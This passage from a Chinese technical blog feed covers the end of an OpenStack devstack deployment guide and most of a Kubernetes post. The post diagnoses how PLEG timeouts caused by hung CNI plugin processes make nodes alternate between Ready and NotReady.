ipv6，则需要修改以下参数：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net.ipv6.conf.all.disable_ipv6=0</span><br><span class="line">net.ipv6.conf.default.disable_ipv6=0</span><br><span class="line">net.ipv6.conf.lo.disable_ipv6=0</span><br><span class="line"></span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure><p>不要按照 devstack 官方文档创建 <code>local.sh</code>。因为 openstack rocky 已经默认使用 neutron 了，这个脚本对 neutron 没有什么作用。<a href="https://bugs.launchpad.net/devstack/+bug/1783576" target="_blank" rel="noopener">https://bugs.launchpad.net/devstack/+bug/1783576</a></p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `seq 2 10`; <span class="hljs-keyword">do</span> /opt/stack/nova/bin/nova-manage fixed reserve 10.4.128.<span class="hljs-variable">$i</span>; <span class="hljs-keyword">done</span></span><br></pre></td></tr></table></figure><p>多节点如果出现调度错误，需要执行：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tools/discover_hosts.sh</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nova-manage cell_v2 discover_hosts --verbose</span><br></pre></td></tr></table></figure><p>如果如果遇到一些未知的问题，尝试拆除环境，清除所有资源后重试：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./unstack.sh</span><br><span class="line">./clean.sh</span><br><span class="line">./stack.sh</span><br></pre></td></tr></table></figure><h2 id="镜像创建"><a href="#镜像创建" class="headerlink" title="镜像创建"></a>镜像创建</h2><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openstack image create --public --disk-format qcow2 --container-format bare --file xenial-server-cloudimg-amd64-disk1.img ubuntu-xenial-server-amd64</span><br></pre></td></tr></table></figure><h2 id="实例创建"><a href="#实例创建" class="headerlink" title="实例创建"></a>实例创建</h2><p>首先进行 admin 认证鉴权：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su - stack</span><br><span class="line"><span class="hljs-built_in">cd</span> /opt/stack/devstack</span><br><span class="line"><span class="hljs-built_in">source</span> openrc</span><br></pre></td></tr></table></figure><p>创建安全组规则，允许 ping 和 ssh：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openstack security group rule create --proto icmp default</span><br><span class="line">openstack security group rule create --proto tcp --dst-port 22 default</span><br></pre></td></tr></table></figure><p>创建测试实例：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openstack server create --flavor m1.tiny \</span><br><span class="line">--image $(openstack image list | grep cirros | cut -f3 -d <span class="hljs-string">'|'</span>) \</span><br><span class="line">--nic net-id=$(openstack network list | grep private | cut -f2 -d <span class="hljs-string">'|'</span> | tr -d <span class="hljs-string">' '</span>) \</span><br><span class="line">--security-group default vm</span><br></pre></td></tr></table></figure><p>创建 floating IP：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openstack floating ip create public</span><br></pre></td></tr></table></figure><p>将 floating IP 与实例绑定：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openstack server add floating ip vm 10.20.102.238</span><br></pre></td></tr></table></figure><p>就可以通过 floating IP 登录 vm 实例了，用户名密码是：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cirros</span><br><span class="line">cubswin:)</span><br></pre></td></tr></table></figure><p>vm 如果需要上外网，需要配置 nat。在物理机上执行：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#ifconfig br-ex 10.20.102.223/27</span></span><br><span class="line">iptables -t nat -I POSTROUTING -s 10.20.102.223/27 -j MASQUERADE</span><br><span class="line">iptables -I FORWARD -s 10.20.102.223/27 -j ACCEPT</span><br><span class="line">iptables -I FORWARD -d 10.20.102.223/27 -j ACCEPT</span><br></pre></td></tr></table></figure><h2 id="配置卷类型"><a href="#配置卷类型" class="headerlink" title="配置卷类型"></a>配置卷类型</h2><p>创建 pv 和 vg：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pvcreate /dev/sdb1</span><br><span class="line">vgcreate stack-volumes-hdd /dev/sdb1</span><br></pre></td></tr></table></figure><p>配置 cinder：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/cinder/cinder.conf</span><br></pre></td></tr></table></figure><figure class="highlight ini hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-section">[DEFAULT]</span></span><br><span class="line"><span class="hljs-attr">default_volume_type</span> = hdd</span><br><span class="line"><span class="hljs-attr">enabled_backends</span> = hdd,ssd</span><br><span class="line"></span><br><span class="line"><span class="hljs-section">[hdd]</span></span><br><span class="line"><span class="hljs-attr">image_volume_cache_enabled</span> = <span class="hljs-literal">True</span></span><br><span class="line"><span class="hljs-attr">volume_clear</span> = zero</span><br><span class="line"><span class="hljs-attr">lvm_type</span> = auto</span><br><span class="line"><span class="hljs-attr">target_helper</span> = tgtadm</span><br><span class="line"><span class="hljs-attr">volume_group</span> = stack-volumes-hdd</span><br><span class="line"><span class="hljs-attr">volume_driver</span> = cinder.volume.drivers.lvm.LVMVolumeDriver</span><br><span class="line"><span class="hljs-attr">volume_backend_name</span> = hdd</span><br></pre></td></tr></table></figure><p>重启 openstack：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart devstack@*</span><br></pre></td></tr></table></figure><p>创建卷类型：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openstack volume <span class="hljs-built_in">type</span> create hdd</span><br><span class="line">openstack volume <span class="hljs-built_in">type</span> <span class="hljs-built_in">set</span> hdd --property volume_backend_name=hdd</span><br></pre></td></tr></table></figure><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="volume-无法创建"><a href="#volume-无法创建" class="headerlink" title="volume 无法创建"></a>volume 无法创建</h3><ul><li>排查</li></ul><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo journalctl -f --unit devstack@c-vol</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mar 06 14:59:18 kirk-system cinder-volume[27813]: ERROR oslo_service.service [None req-e1391562-6252-4b98-ba3a-6420edbafffe None None] Error starting thread.: DetachedInstanceError: Parent instance &lt;VolumeAttachment at 0x7f6455ffee90&gt; is not bound to a Session; lazy load operation of attribute &apos;volume&apos; cannot proceed (Background on this error at: http://sqlalche.me/e/bhk3)</span><br></pre></td></tr></table></figure><ul><li>解决</li></ul><p><a href="https://ask.openstack.org/en/question/103315/cinder-volume-attached-to-a-terminated-server-now-i-cant-delete-it/" target="_blank" rel="noopener">https://ask.openstack.org/en/question/103315/cinder-volume-attached-to-a-terminated-server-now-i-cant-delete-it/</a></p><h3 id="ubuntu-18-04-切换到-etc-network-interface"><a href="#ubuntu-18-04-切换到-etc-network-interface" class="headerlink" title="ubuntu 18.04 切换到 /etc/network/interface"></a>ubuntu 18.04 切换到 /etc/network/interface</h3><p><a href="https://askubuntu.com/questions/1031709/ubuntu-18-04-switch-back-to-etc-network-interfaces" target="_blank" rel="noopener">https://askubuntu.com/questions/1031709/ubuntu-18-04-switch-back-to-etc-network-interfaces</a></p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><p>golang SDK：<a href="http://gophercloud.io/docs/compute/#servers" target="_blank" rel="noopener">http://gophercloud.io/docs/compute/#servers</a></p></li><li><p>terraform：<a href="https://www.terraform.io/docs/providers/openstack/" target="_blank" rel="noopener">https://www.terraform.io/docs/providers/openstack/</a></p></li><li><p>获取 Openstack 镜像：<a href="https://docs.openstack.org/image-guide/obtain-images.html" target="_blank" rel="noopener">https://docs.openstack.org/image-guide/obtain-images.html</a></p></li><li><p>使用 systemd 管理 devstack：<a href="https://docs.openstack.org/devstack/rocky/systemd.html" target="_blank" rel="noopener">https://docs.openstack.org/devstack/rocky/systemd.html</a></p></li><li><p>devstack networking：</p><ul><li><a href="https://docs.openstack.org/devstack/rocky/networking.html" target="_blank" rel="noopener">https://docs.openstack.org/devstack/rocky/networking.html</a></li><li><a href="https://wiki.openstack.org/wiki/OpsGuide-Network-Troubleshooting" target="_blank" rel="noopener">https://wiki.openstack.org/wiki/OpsGuide-Network-Troubleshooting</a></li></ul></li><li><p>neutron 相关：</p><ul><li><a href="https://docs.openstack.org/devstack/rocky/guides/neutron.html" target="_blank" rel="noopener">https://docs.openstack.org/devstack/rocky/guides/neutron.html</a></li><li><a href="https://www.ibm.com/developerworks/cn/cloud/library/1402_chenhy_openstacknetwork/" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/cloud/library/1402_chenhy_openstacknetwork/</a></li></ul></li></ul><h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>neutron+vlan 模式配置：</p><figure class="highlight ini hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-section">[[local|localrc]]</span></span><br><span class="line"><span class="hljs-attr">HOST_IP</span>=<span class="hljs-number">10.20</span>.<span class="hljs-number">102.37</span></span><br><span class="line"><span class="hljs-attr">PUBLIC_INTERFACE</span>=bond1</span><br><span class="line"><span class="hljs-attr">LOGFILE</span>=/opt/stack/logs/stack.sh.log</span><br><span class="line"><span class="hljs-attr">ADMIN_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">DATABASE_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">RABBIT_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">SERVICE_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">LIBVIRT_TYPE</span>=kvm</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">## Neutron options</span></span><br><span class="line"><span class="hljs-attr">IP_VERSION</span>=<span class="hljs-number">4</span></span><br><span class="line"><span class="hljs-attr">Q_USE_SECGROUP</span>=<span class="hljs-literal">True</span></span><br><span class="line"><span class="hljs-attr">ENABLE_TENANT_VLANS</span>=<span class="hljs-literal">True</span></span><br><span class="line"><span class="hljs-attr">TENANT_VLAN_RANGE</span>=<span class="hljs-number">3001</span>:<span class="hljs-number">4000</span></span><br><span class="line"><span class="hljs-attr">PHYSICAL_NETWORK</span>=default</span><br><span class="line"><span class="hljs-attr">OVS_PHYSICAL_BRIDGE</span>=br-ex</span><br><span class="line"><span class="hljs-attr">Q_USE_PROVIDER_NETWORKING</span>=<span class="hljs-literal">True</span></span><br><span class="line">disable_service q-l3</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">## Neutron Networking options used to create Neutron Subnets</span></span><br><span class="line"><span class="hljs-attr">IPV4_ADDRS_SAFE_TO_USE</span>=<span class="hljs-string">"203.0.113.0/24"</span></span><br><span class="line"><span class="hljs-attr">NETWORK_GATEWAY</span>=<span class="hljs-number">203.0</span>.<span class="hljs-number">113.1</span></span><br><span class="line"><span class="hljs-attr">PROVIDER_SUBNET_NAME</span>=<span class="hljs-string">"provider_net"</span></span><br><span class="line"><span class="hljs-attr">PROVIDER_NETWORK_TYPE</span>=<span class="hljs-string">"vlan"</span></span><br><span class="line"><span class="hljs-attr">SEGMENTATION_ID</span>=<span class="hljs-number">2010</span></span><br><span class="line"><span class="hljs-attr">USE_SUBNETPOOL</span>=<span class="hljs-literal">False</span></span><br></pre></td></tr></table></figure><figure class="highlight ini hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-section">[[local|localrc]]</span></span><br><span class="line"><span class="hljs-attr">HOST_IP</span>=<span class="hljs-number">10.20</span>.<span class="hljs-number">102.38</span> # change this per compute node</span><br><span class="line"><span class="hljs-attr">LOGFILE</span>=/opt/stack/logs/stack.sh.log</span><br><span class="line"><span class="hljs-attr">ADMIN_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">DATABASE_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">RABBIT_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">SERVICE_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">DATABASE_TYPE</span>=mysql</span><br><span class="line"><span class="hljs-attr">SERVICE_HOST</span>=<span class="hljs-number">10.20</span>.<span class="hljs-number">102.37</span></span><br><span class="line"><span class="hljs-attr">MYSQL_HOST</span>=<span class="hljs-variable">$SERVICE_HOST</span></span><br><span class="line"><span class="hljs-attr">RABBIT_HOST</span>=<span class="hljs-variable">$SERVICE_HOST</span></span><br><span class="line"><span class="hljs-attr">GLANCE_HOSTPORT</span>=<span class="hljs-variable">$SERVICE_HOST</span>:<span class="hljs-number">9292</span></span><br><span class="line"><span class="hljs-attr">ENABLED_SERVICES</span>=n-cpu,q-agt,n-api-meta,c-vol,placement-client</span><br><span class="line"><span class="hljs-attr">NOVA_VNC_ENABLED</span>=<span class="hljs-literal">True</span></span><br><span class="line"><span class="hljs-attr">NOVNCPROXY_URL</span>=<span class="hljs-string">"http://$SERVICE_HOST:6080/vnc_auto.html"</span></span><br><span class="line"><span class="hljs-attr">VNCSERVER_LISTEN</span>=<span class="hljs-variable">$HOST_IP</span></span><br><span class="line"><span class="hljs-attr">VNCSERVER_PROXYCLIENT_ADDRESS</span>=<span class="hljs-variable">$VNCSERVER_LISTEN</span></span><br><span class="line"><span class="hljs-attr">LIBVIRT_TYPE</span>=kvm</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Services that a compute node runs</span></span><br><span class="line"><span class="hljs-attr">ENABLED_SERVICES</span>=n-cpu,rabbit,q-agt</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">## Open vSwitch provider networking options</span></span><br><span class="line"><span class="hljs-attr">IP_VERSION</span>=<span class="hljs-number">4</span></span><br><span class="line"><span class="hljs-attr">PHYSICAL_NETWORK</span>=default</span><br><span class="line"><span class="hljs-attr">OVS_PHYSICAL_BRIDGE</span>=br-ex</span><br><span class="line"><span class="hljs-attr">PUBLIC_INTERFACE</span>=bond1</span><br><span class="line"><span class="hljs-attr">Q_USE_PROVIDER_NETWORKING</span>=<span class="hljs-literal">True</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 云计算 </tag>
            
            <tag> Openstack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PLEG unhealthy 导致节点状态不断在 Ready/NotReady 之间切换问题</title>
      <link href="/hexo-blog/20181127/PLEG-unhealthy-%E5%AF%BC%E8%87%B4%E8%8A%82%E7%82%B9%E7%8A%B6%E6%80%81%E4%B8%8D%E6%96%AD%E5%9C%A8-Ready-NotReady-%E4%B9%8B%E9%97%B4%E5%88%87%E6%8D%A2%E9%97%AE%E9%A2%98/"/>
      <url>/hexo-blog/20181127/PLEG-unhealthy-%E5%AF%BC%E8%87%B4%E8%8A%82%E7%82%B9%E7%8A%B6%E6%80%81%E4%B8%8D%E6%96%AD%E5%9C%A8-Ready-NotReady-%E4%B9%8B%E9%97%B4%E5%88%87%E6%8D%A2%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><ol><li>收到告警提示 PLEG 延时升高（240s）</li></ol><a id="more"></a> <img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/1.png"> <img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/2.png"><ol start="2"><li>节点状态在 Ready 和 NotReady 之间频繁切换</li></ol><img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/3.png"> <img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/4.png"><ol start="3"><li>有 pod 处于 Terminating 状态</li></ol><h2 id="排查和原因分析"><a href="#排查和原因分析" class="headerlink" title="排查和原因分析"></a>排查和原因分析</h2><p>查看 kubelet PLEG 相关日志，发现大量 PLEG 超时日志：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nov 27 10:10:07 xq68 kubelet[24562]: E1127 10:10:07.444787   24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceeded</span><br><span class="line">Nov 27 10:14:08 xq68 kubelet[24562]: E1127 10:14:08.502149   24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceeded</span><br><span class="line">Nov 27 10:18:09 xq68 kubelet[24562]: E1127 10:18:09.555935   24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceeded</span><br><span class="line">Nov 27 10:22:10 xq68 kubelet[24562]: E1127 10:22:10.838479   24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceeded</span><br><span class="line">Nov 27 10:26:11 xq68 kubelet[24562]: E1127 10:26:11.878116   24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceeded</span><br><span class="line">Nov 27 10:30:12 xq68 kubelet[24562]: E1127 10:30:12.928984   24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceeded</span><br><span class="line">Nov 27 10:34:13 xq68 kubelet[24562]: E1127 10:34:13.993793   24562 generic.go:271] PLEG: pod apiserver-inspection-workers-ds-1542964416453270535-6vhmt/qiniu-ranger failed reinspection: rpc error: code = DeadlineExceeded desc = context deadline exceeded</span><br></pre></td></tr></table></figure><p>PLEG (Pod Lifecycle Event Generator) 是 kubelet 定期检查节点上每个 pod 状态的逻辑，它内部缓存了节点所有 pod 的状态，每次通过 relist 时从 container runtime (dockerd) 获取 pod (也就是 pod 包含的所有 container) 的最新状态，然后和当前缓存比较，产生 <code>PodLifecycleEvent</code>。然后遍历所有的 events，更新 pod 状态缓存后将该 event 发送至 event channel。部分代码如下：</p><img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/5.png"><p>而问题就出在更新 Pod 缓存的逻辑，首先 PLEG 更新缓存是串行的，也就是前一个 Pod 执行成功了，后一个 Pod 才能开始；其次，更新缓存会调用 container runtime 的 <code>GetPodStatus</code> 接口来获取 Pod 状态（通过 rpc 获取容器状态和 Pod IP）；而 rpc 调用是阻塞的，默认 120s (2min) 超时；PLEG 只要发现两次 relist 间隔超过 3min，就会认为 PLEG unhealthy，将节点设为 NotReady。</p><img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/6.png"> <img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/7.png"><p>上面的 <code>GetPodStatus</code> 中有调用 cri 的 rpc 接口 PodSandboxStatus 和 <code>ListContainers</code>/<code>ContainerStatus</code> 分别获取 pause 容器和其他容器的状态。</p><img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/8.png"><p>其中 ListContainers/ContainerStatus 里只会从 docker daemon 获取容器信息，而 PodSandboxStatus 不仅会从 docker daemon 获取 pause 容器信息，还会从 CNI 通过 GetPodNetworkStatus 接口获取 pod ip。这几个请求都是 grpc 请求，且超时时间都是 2min，如果中间因为各种原因 hang 住，会阻塞 2min 才能超时返回。</p><img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/9.png"> <img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/10.png"> <img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/11.png"><p>简单整理了整个调用逻辑如下：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">         grpc       http           grpc</span><br><span class="line">kubelet &lt;----&gt; cri &lt;----&gt; dockerd &lt;----&gt; containerd</span><br><span class="line">                   &lt;----&gt;   cni   &lt;----&gt; network plugin      </span><br><span class="line">                    grpc          command</span><br></pre></td></tr></table></figure><p>同时由上面代码分析，PLEG 超时的原因，就是在更新某个 Pod 状态时，kubelet 通过 rpc 调用 docker daemon 或者 network plugin 时超时了。</p><p><strong>调用 docker daemon 超时的原因有：</strong></p><p>docker daemon hang 住。</p><p><strong>调用 network plugin 超时的原因有：</strong></p><p>network plugin 是利用 command exec 方式调用的， 因为各种原因进程不退出，会导致调用 hang 住。</p><p>调用 network plugin 还有个细节，就是每次调用前会按照 pod 加锁，<strong>所以只要一次调用 hang 住，后面的调用都会 hang 住，等待锁释放</strong>。</p><img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/12.png"><p>但是为什么对一个 Pod 调用 GetPodStatus 时 grpc 超时会导致 PLEG unhealthy 呢？我们先看看两个逻辑：</p><p>一是 relist 时的 updateCache 逻辑：</p><p>PLEG 每次 relist 时不仅要对当前状态有更新的 Pod 进行一次状态获取，还要对上次获取失败的 Pod 重新执行一次状态获取。也就是说，如果一个 grpc 请求的超时是 2min，那么假设一个 Pod 有问题，会将单次 relist 耗时放大至 4min。</p><img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/13.png"><p>二是 PLEG healthy check 逻辑：</p><img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/14.png"> <img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/15.png"><p>Runtime Health Checker 会定时调用 PLEG 的 Healty 函数对 PLEG 执行状态进行检测，从而判断节点的健康状况。每次检测时，只要判断距离上次执行完 relist 的时间大于 3 分钟，上层逻辑就会认为节点不健康了，便会根据结果将节点设置为 NotReady。</p><p>现在的场景是 PLEG relist 会执行，但是每次执行对于有问题的 Pod 要执行两次 updateCache/GetPodStatus，也就是等两次超时需要 4min 时间。Runtime Healthy Checker 每隔 100ms ~ 5s 执行一次，因此在 4min 内，前 3min 的 health check 是成功的，成功之后会将节点标记为 Ready，而 3min 后的 1min 内 healthy check 会失败，kubelet 又会将节点标记为 NotReady。</p><p>这个也能从监控图像上得到证实，如下图，ready status == 1 的间隔是 3min，ready status == 0 的间隔是 1min。</p><img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/16.png"><p>接下来我们一步步确认是哪个组件出了问题导致的：</p><p>确认 docker daemon 状态，看状态获取接口是否正常：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --unix-socket /var/run/docker.sock http:/containers/40cddec6426e280b8e42a07ca5c8711d18557f3163c2541efd39462ccba10e39/json</span><br></pre></td></tr></table></figure><p>结果正常返回。</p><p>再查看网络组件进程状态，发现 nuke 和 nuke-ipam 两个进程从 2018-11-23 启动后一直没有退出（今天是 2018-11-27）。正常情况下，nuke 和 nkue-ipam 只在 kubelet 通过 cni 调用时执行，执行成功后会立即退出，而现在没有退出是个异常。因此判断问题可能出在 nuke 组件上。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@xq68:~<span class="hljs-comment"># ps aux | grep nuke</span></span><br><span class="line">root     21122  3.3  0.0  40064 38164 ?        Ssl  Nov19 390:35 /nuke/nukedaemon</span><br><span class="line">root     22814  0.0  0.0 116436  8528 ?        Sl   Nov23   0:00 /opt/cni/bin/nuke</span><br><span class="line">root     22831  0.0  0.0 115204  8192 ?        Sl   Nov23   0:00 /opt/cni/bin/nuke-ipam</span><br><span class="line">root     24012  0.0  0.0  14224  1032 pts/32   S+   10:24   0:00 grep --color=auto nuke</span><br><span class="line">root     29315  0.0  0.0   1560   960 ?        Ss   Jul27   0:00 sh /app/install-nuke-cni.sh</span><br><span class="line">root     31448  0.0  0.0  28280 23696 ?        Ssl  Nov01  28:36 /bin/nuke-l3-agent</span><br></pre></td></tr></table></figure><p>之前出现同样的问题时，为方便排查，我保存了 nuke 相关的 stack 信息，具体原因还需要网络组协助排查。</p><img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/17.png"><p>另外，如果网络方案为 calico，calico 进程 Z 住也会导致该问题：</p><img src="/hexo-blog/20181127/PLEG-unhealthy-导致节点状态不断在-Ready-NotReady-之间切换问题/18.png"><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>解决方式有：（选一种即可）</p><ol><li><p>删除问题容器（一般都是 pause 容器）</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a | grep apiserver-inspection-workers-ds-1542964416453270535-6vhmt</span><br><span class="line">docker rm -f &lt;container_id&gt;</span><br></pre></td></tr></table></figure><p>删除后 kubelet 已经找不到这个容器，会认为 sandbox 已经 stop 成功，就不会再继续执行 PodSandBoxStatus 调用 cri 和 cni，从而就不会触发有问题的逻辑了。</p></li><li><p>重启 kubelet（待验证）</p></li><li><p>对于 neutron 网络方案，手动 kill 掉 hang 住的 nuke 和 nuke-ipam，network plugin 强行返回错误，kubelet 会继续执行后续逻辑。</p></li></ol><h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><h3 id="优化-kubelet-PLEG-逻辑"><a href="#优化-kubelet-PLEG-逻辑" class="headerlink" title="优化 kubelet PLEG 逻辑"></a>优化 kubelet PLEG 逻辑</h3><ul><li>考虑并行执行，一个 Pod 有问题时不影响整个 PLEG relist 耗时；</li><li>缩小 rpc 超时时间（目前 2min），对于正常场景来说，调用 cri 和 cni 都用不了这么长的时间。缩小超时可以减小单个 Pod 超时对 PLEG 整体的影响；</li><li>优化 updateCache 逻辑，保证每次 relist 对同一个 Pod 